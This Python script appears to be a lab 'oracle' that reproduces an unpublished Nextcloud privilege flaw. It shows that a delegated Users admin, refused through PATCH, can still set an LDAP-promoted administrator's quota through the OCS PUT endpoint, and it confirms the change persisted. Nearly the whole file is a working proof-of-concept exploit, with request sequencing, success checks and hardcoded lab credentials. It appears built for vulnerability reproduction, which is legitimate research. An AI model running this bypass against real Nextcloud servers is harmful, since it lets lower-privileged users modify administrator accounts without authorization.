#!/usr/bin/env python3
"""Local oracle for unpublished Nextcloud PUT vs PATCH admin check.

Delegated Users admin (not instance admin) PUTs quota on an LDAP-promoted
admin who is isAdmin() but not in local group admin. PATCH correctly 403s.

Loopback only. No shells.
"""
from __future__ import annotations

import base64
import json
import os
import subprocess
import urllib.error
import urllib.parse
import urllib.request
from dataclasses import dataclass
from pathlib import Path
from typing import Any

LABEL = "NEXTCLOUD-LDAP-PUT-ISADMIN"
WITNESS = "NEXTCLOUD-LDAP-PUT-ISADMIN-WITNESS"
DEFAULT_BASE = "http://127.0.0.1:18342"
DEFAULT_ADMIN_USER = "admin"
DEFAULT_ADMIN_PASSWORD = "LabAdmin35!"
DEFAULT_HELPDESK_USER = "helpdesk"
DEFAULT_HELPDESK_PASSWORD = "LabHelpdesk35!"
DEFAULT_TARGET_UID = "ldapadmin"
DEFAULT_COMPOSE_PROJECT = "nextcloud-ldap-put-isadmin"
USER_AGENT = "nextcloud-ldap-put-isadmin-lab"
QUOTA_VALUE = "1 GB"
QUOTA_BYTES = 1073741824
OCS_USERS = "/ocs/v2.php/cloud/users"
FIXTURE_REMOTE = "nextcloud:/tmp/nc-ldap-put-isadmin-fixture.php"
FIXTURE_PHP = "/tmp/nc-ldap-put-isadmin-fixture.php"
HTTP_TIMEOUT_S = 60.0
COMPOSE_EXEC_TIMEOUT_S = 120
COMPOSE_CP_TIMEOUT_S = 60
OCS_GET_OK = (200, 201)
HTTP_OK = 200
HTTP_FORBIDDEN = 403
HTTP_NOT_FOUND = 404
SNIPPET_SHORT = 400
SNIPPET_JSON = 500
SNIPPET_STDERR = 300
SNIPPET_FIXTURE = 800
LOCAL_ADMIN_GROUP = "admin"


class LabError(Exception):
    """Oracle aborted; the message is the FAIL reason."""


@dataclass(frozen=True)
class Config:
    here: Path
    base: str
    admin_user: str
    admin_password: str
    helpdesk_user: str
    helpdesk_password: str
    target_uid: str
    compose_project: str


def fail(reason: str) -> int:
    print(f"FAIL {LABEL} {reason}", flush=True)
    return 1


def load_config() -> Config:
    return Config(
        here=Path(__file__).resolve().parent,
        base=os.environ.get("NC_URL", DEFAULT_BASE).rstrip("/"),
        admin_user=os.environ.get("NC_ADMIN_USER", DEFAULT_ADMIN_USER),
        admin_password=os.environ.get("NC_ADMIN_PASSWORD", DEFAULT_ADMIN_PASSWORD),
        helpdesk_user=os.environ.get("NC_HELPDESK_USER", DEFAULT_HELPDESK_USER),
        helpdesk_password=os.environ.get(
            "NC_HELPDESK_PASSWORD", DEFAULT_HELPDESK_PASSWORD
        ),
        target_uid=os.environ.get("NC_LDAP_UID", DEFAULT_TARGET_UID),
        compose_project=os.environ.get("COMPOSE_PROJECT_NAME", DEFAULT_COMPOSE_PROJECT),
    )


def _basic_auth(user: str, password: str) -> str:
    token = base64.b64encode(f"{user}:{password}".encode("utf-8")).decode("ascii")
    return "Basic " + token


def _http(
    method: str,
    url: str,
    *,
    data: bytes | None = None,
    headers: dict[str, str] | None = None,
    timeout: float = HTTP_TIMEOUT_S,
) -> tuple[int, dict[str, str], bytes]:
    hdrs = {"User-Agent": USER_AGENT}
    if headers:
        hdrs.update(headers)
    req = urllib.request.Request(url, data=data, headers=hdrs, method=method)
    try:
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            body = resp.read()
            return resp.status, {k.lower(): v for k, v in resp.headers.items()}, body
    except urllib.error.HTTPError as exc:
        return exc.code, {k.lower(): v for k, v in exc.headers.items()}, exc.read()
    except urllib.error.URLError as exc:
        raise LabError(f"http {method} {url} error {exc}") from exc


def _ocs(
    cfg: Config,
    method: str,
    path: str,
    user: str,
    password: str,
    *,
    json_payload: dict[str, Any] | None = None,
    form: dict[str, str] | None = None,
) -> tuple[int, dict[str, Any], str]:
    hdrs = {
        "OCS-APIRequest": "true",
        "Accept": "application/json",
        "Authorization": _basic_auth(user, password),
    }
    body: bytes | None = None
    if json_payload is not None:
        hdrs["Content-Type"] = "application/json"
        body = json.dumps(json_payload).encode("utf-8")
    elif form is not None:
        hdrs["Content-Type"] = "application/x-www-form-urlencoded"
        body = urllib.parse.urlencode(form).encode("utf-8")
    sep = "&" if "?" in path else "?"
    url = cfg.base + path + sep + "format=json"
    code, _, raw = _http(method, url, data=body, headers=hdrs)
    text = raw.decode("utf-8", "replace")
    try:
        loaded: Any = json.loads(text) if text else {}
    except json.JSONDecodeError as exc:
        raise LabError(
            f"ocs {method} {path} http={code} not json body={text[:SNIPPET_SHORT]!r}"
        ) from exc
    parsed: dict[str, Any] = loaded if isinstance(loaded, dict) else {}
    return code, parsed, text


def _ocs_data(parsed: dict[str, Any]) -> Any:
    ocs_wrap = parsed.get("ocs") if isinstance(parsed, dict) else None
    if isinstance(ocs_wrap, dict):
        return ocs_wrap.get("data")
    return None


def _ocs_meta(parsed: dict[str, Any]) -> dict[str, Any]:
    ocs_wrap = parsed.get("ocs") if isinstance(parsed, dict) else None
    if isinstance(ocs_wrap, dict) and isinstance(ocs_wrap.get("meta"), dict):
        return ocs_wrap["meta"]
    return {}


def _groups_from_user_data(data: object) -> list[str]:
    if not isinstance(data, dict):
        return []
    groups = data.get("groups") or []
    if isinstance(groups, dict):
        groups = groups.get("element", list(groups.values()))
    if isinstance(groups, str):
        return [groups]
    if isinstance(groups, list):
        out: list[str] = []
        for item in groups:
            if isinstance(item, dict):
                gid = item.get("id") or item.get("gid")
                if gid is not None:
                    out.append(str(gid))
            else:
                out.append(str(item))
        return out
    return []


def _quota_bytes(data: object) -> int | None:
    if not isinstance(data, dict):
        return None
    quota = data.get("quota")
    if isinstance(quota, dict):
        raw = quota.get("quota")
        if isinstance(raw, (int, float)):
            return int(raw)
        if isinstance(raw, str) and raw.isdigit():
            return int(raw)
    if isinstance(quota, (int, float)):
        return int(quota)
    return None


def _dump_data(data: object) -> str:
    if isinstance(data, dict):
        return json.dumps(data)[:SNIPPET_JSON]
    return repr(data)


def _compose_exec(
    cfg: Config, *args: str, timeout: int = COMPOSE_EXEC_TIMEOUT_S
) -> subprocess.CompletedProcess[str]:
    return subprocess.run(
        ["docker", "compose", "-p", cfg.compose_project, "exec", "-T", *args],
        cwd=cfg.here,
        capture_output=True,
        text=True,
        timeout=timeout,
        check=False,
    )


def _fixture_flags(cfg: Config) -> dict[str, Any]:
    copied = subprocess.run(
        [
            "docker",
            "compose",
            "-p",
            cfg.compose_project,
            "cp",
            str(cfg.here / "fixture.php"),
            FIXTURE_REMOTE,
        ],
        cwd=cfg.here,
        capture_output=True,
        text=True,
        timeout=COMPOSE_CP_TIMEOUT_S,
        check=False,
    )
    if copied.returncode != 0:
        raise LabError(
            f"docker compose cp fixture.php rc={copied.returncode} "
            f"{copied.stderr[:SNIPPET_STDERR]!r}"
        )
    proc = _compose_exec(
        cfg,
        "-u",
        "www-data",
        "-e",
        f"NC_LDAP_UID={cfg.target_uid}",
        "-e",
        f"NC_HELPDESK_USER={cfg.helpdesk_user}",
        "-w",
        "/var/www/html",
        "nextcloud",
        "php",
        FIXTURE_PHP,
    )
    text = (proc.stdout or "").strip()
    print(
        f"IOC php-fixture rc={proc.returncode} stdout={text[:SNIPPET_FIXTURE]!r} "
        f"stderr={(proc.stderr or '')[:SNIPPET_STDERR]!r}",
        flush=True,
    )
    if not text:
        raise LabError("php fixture empty")
    try:
        parsed: Any = json.loads(text)
    except json.JSONDecodeError as exc:
        raise LabError(f"php fixture not json {text[:SNIPPET_SHORT]!r}") from exc
    if not isinstance(parsed, dict) or parsed.get("error"):
        raise LabError(f"php fixture {parsed}")
    return parsed


def _user_path(uid: str) -> str:
    return f"{OCS_USERS}/{uid}"


def run_oracle(cfg: Config) -> int:
    print(
        f"IOC base={cfg.base} actor={cfg.helpdesk_user} "
        f"target={cfg.target_uid} witness={WITNESS}",
        flush=True,
    )

    flags = _fixture_flags(cfg)
    print(
        f"IOC target-isAdmin={flags.get('target_isAdmin')!s} "
        f"target-isInGroupAdmin={flags.get('target_isInGroupAdmin')!s} "
        f"target-groups={flags.get('target_groups')!r}",
        flush=True,
    )
    print(
        f"IOC actor-isAdmin={flags.get('actor_isAdmin')!s} "
        f"actor-isDelegatedAdmin={flags.get('actor_isDelegatedAdmin')!s} "
        f"actor-isInGroupAdmin={flags.get('actor_isInGroupAdmin')!s} "
        f"actor-groups={flags.get('actor_groups')!r}",
        flush=True,
    )
    if flags.get("target_isAdmin") is not True:
        return fail("target isAdmin not true (LDAP never promoted)")
    if flags.get("target_isInGroupAdmin") is not False:
        return fail("target is in local admin group (wrong fixture)")
    if flags.get("actor_isDelegatedAdmin") is not True:
        return fail("helpdesk isDelegatedAdmin not true")
    if flags.get("actor_isInGroupAdmin") is not False or flags.get("actor_isAdmin") is True:
        return fail("helpdesk is instance admin (wrong fixture)")

    code, parsed, text = _ocs(
        cfg,
        "GET",
        _user_path(cfg.helpdesk_user),
        cfg.helpdesk_user,
        cfg.helpdesk_password,
    )
    data = _ocs_data(parsed)
    actor_groups = _groups_from_user_data(data)
    print(
        f"IOC helpdesk-login http={code} meta={_ocs_meta(parsed)} groups={actor_groups}",
        flush=True,
    )
    if code not in OCS_GET_OK:
        return fail(f"helpdesk login/info http={code} body={text[:SNIPPET_SHORT]!r}")
    if LOCAL_ADMIN_GROUP in [str(g) for g in actor_groups]:
        return fail("helpdesk is in admin group (wrong fixture)")

    code, parsed, text = _ocs(
        cfg,
        "GET",
        _user_path(cfg.target_uid),
        cfg.helpdesk_user,
        cfg.helpdesk_password,
    )
    data = _ocs_data(parsed)
    target_groups = _groups_from_user_data(data)
    before_quota = _quota_bytes(data)
    print(
        f"IOC target-get http={code} groups={target_groups} quota={before_quota} "
        f"data={_dump_data(data)}",
        flush=True,
    )
    if code not in OCS_GET_OK:
        return fail(f"target get as helpdesk http={code} body={text[:SNIPPET_SHORT]!r}")
    if LOCAL_ADMIN_GROUP in [str(g) for g in target_groups]:
        return fail("target is in local admin group (wrong fixture)")

    patch_code, patch_parsed, patch_text = _ocs(
        cfg,
        "PATCH",
        _user_path(cfg.target_uid),
        cfg.helpdesk_user,
        cfg.helpdesk_password,
        json_payload={"quota": QUOTA_VALUE},
    )
    patch_meta = _ocs_meta(patch_parsed)
    print(
        f"IOC patch http={patch_code} meta={patch_meta} body={patch_text[:SNIPPET_SHORT]!r}",
        flush=True,
    )
    if patch_code == HTTP_OK:
        return fail("PATCH 200 (target not isAdmin / LDAP never promoted)")
    if patch_code != HTTP_FORBIDDEN:
        return fail(f"PATCH expected 403 got http={patch_code} meta={patch_meta}")

    put_code, put_parsed, put_text = _ocs(
        cfg,
        "PUT",
        _user_path(cfg.target_uid),
        cfg.helpdesk_user,
        cfg.helpdesk_password,
        form={"key": "quota", "value": QUOTA_VALUE},
    )
    put_meta = _ocs_meta(put_parsed)
    print(
        f"IOC put http={put_code} meta={put_meta} body={put_text[:SNIPPET_SHORT]!r}",
        flush=True,
    )
    if put_code in (HTTP_FORBIDDEN, HTTP_NOT_FOUND):
        return fail(f"PUT {put_code} (gate also blocked; expected 200)")
    if put_code != HTTP_OK:
        return fail(f"PUT expected 200 got http={put_code} meta={put_meta}")

    code, parsed, text = _ocs(
        cfg,
        "GET",
        _user_path(cfg.target_uid),
        cfg.admin_user,
        cfg.admin_password,
    )
    data = _ocs_data(parsed)
    after_quota = _quota_bytes(data)
    quota_str: str | None = None
    if isinstance(data, dict):
        quota = data.get("quota")
        if isinstance(quota, dict):
            quota_str = str(quota.get("quota"))
    print(
        f"IOC quota-after http={code} bytes={after_quota} raw={quota_str} "
        f"data={_dump_data(data)}",
        flush=True,
    )
    accepted = {str(QUOTA_BYTES), QUOTA_VALUE, "1 GB", "1GB"}
    if after_quota != QUOTA_BYTES and quota_str not in accepted:
        return fail(
            f"quota not persisted after PUT bytes={after_quota} raw={quota_str}"
        )

    print(
        f"SUCCESS {LABEL} who=delegated-users-admin "
        f"target={cfg.target_uid} put={put_code} patch={patch_code} {WITNESS}",
        flush=True,
    )
    return 0


def main() -> int:
    try:
        return run_oracle(load_config())
    except LabError as exc:
        return fail(str(exc))
    except Exception as exc:
        return fail(f"unhandled {type(exc).__name__}: {exc}")


if __name__ == "__main__":
    raise SystemExit(main())
